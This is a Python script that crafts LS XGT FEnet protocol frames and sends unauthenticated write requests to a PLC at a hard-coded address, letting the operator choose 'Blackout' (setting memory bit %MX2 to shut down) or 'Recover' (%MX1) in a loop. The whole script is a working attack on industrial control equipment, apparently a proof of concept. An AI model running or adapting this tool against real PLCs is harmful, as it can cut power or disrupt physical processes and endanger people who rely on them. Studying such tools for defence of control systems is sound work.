from socket import *
import time
# from hexdump import hexdump 
from construct import * 
import binascii

FEnet = Struct(
    # ---------- Header ----------
    'Company_ID' / Bytes(8),	# "LSIS-XGT" + "NULL NULL" (ASCII CODE: 4C 53 49 53 2D 58 47 54 00 00)
    'Reserved' /Int16ul, 	# ASCII CODE: 00 (Can be anything.)	
    'PLC_Info' /Int16ul,	# ASCII CODE: 00 (Can be anything.)
    'CPU_Info' /Int8ul,		# ASCII CODE: 00 (Can be anything.)
    'Source_Frame' /Int8ul,	# ASCII CODE: 33 (Can be anything.)
    'Invoke_ID' /Int16ul,	# Used to discriminate the sequence among frames (ASCII: XX XX) (Can be anything.)
    'Length' /Int16ul,		# Length of the data area (ASCII CODE: 11)
    'FEnet_Position' /Int8ul,	# ASCII CODE: 00
    'Reserved2' /Int8ul,	# ASCII CODE: 00
    # ---------- Data ----------
    'Instruction' /Int16ul,     # 0x0054 read_request 
                                # 0x0055 read_response    
                                # 0x0058 write_request (ASCII CODE: 58 00)	<--------- 
                                # 0x0059 write_response    
    'Data_Type' /Int16ul,       # 0x0000 bit <--------  
                                # 0x0001 byte  
                                # 0x0002 word 
                                # 0x0003 dword 
    'Reserved3' /Int16ul,	# 0x0000 (Don't Care)
    'Variable_Count' /Int16ul,	# Specifies number of blocks composed of [Variable Length][Variable]
    'Variable_Length' /Int16ul,	# Number of characters in the Variable field
    'Variable' / Bytes(4),	# The address of the memory device to be read. (For bit: %(P,M,L,K,F,T)X) It displays block's start address (Ex: %MX0). 
    'Data_Length' /Int16ul,	# Number of characters in the Data
    'Data_Value' /Int8ul,	# Data to write
)

TARGET_IP = "192.168.1.4" # PLC IP 
TARGET_PORT = 2004 # PLC PORT

print ("----------------------------------------") 
print (f"Target PLC Info : {TARGET_IP}:{TARGET_PORT}") 
print ("----------------------------------------") 

# packet = b'\x4c\x53\x49\x53\x2d\x58\x47\x54\x00\x00\x00\x00\x00\x33\x7c\xbf\x11\x00\x00\xda\x58\x00\x00\x00\x00\x00\x01\x00\x04\x00\x25\x4d\x58\x30\x01\x00\x01'

packet = b'\x4c\x53\x49\x53\x2d\x58\x47\x54\x00\x00\x11\x12\x34\x22\x3d\x6c\x11\x00\x00\xda\x58\x00\x00\x00\x00\x00\x01\x00\x04\x00\x25\x4d\x58\x30\x01\x00\x01'

p = FEnet.parse(packet) 

# Connect to the target
clientSocket = socket(AF_INET,SOCK_STREAM)
clientSocket.connect((TARGET_IP,TARGET_PORT))

# ---------------------------------------------
# Shutdown
# p['Variable'] = '%MX2'.encode() 
# p['Data_Value'] = 1 

# Recover 
# p['Variable'] = '%MX1'.encode() 
# p['Data_Value'] = 1 
# ---------------------------------------------

while True:
	num = input("Blackout (1) or Recover (2):\n")
	print(p) 
	if int(num) == 1:
		p['Variable'] = '%MX2'.encode() # Shutdown 
		p['Data_Value'] = 1 
	elif int(num) == 2:
		p['Variable'] = '%MX1'.encode() # Recover 
		p['Data_Value'] = 1
	else:
		break
	clientSocket.send(FEnet.build(p))
	print(p) 

clientSocket.close()
        
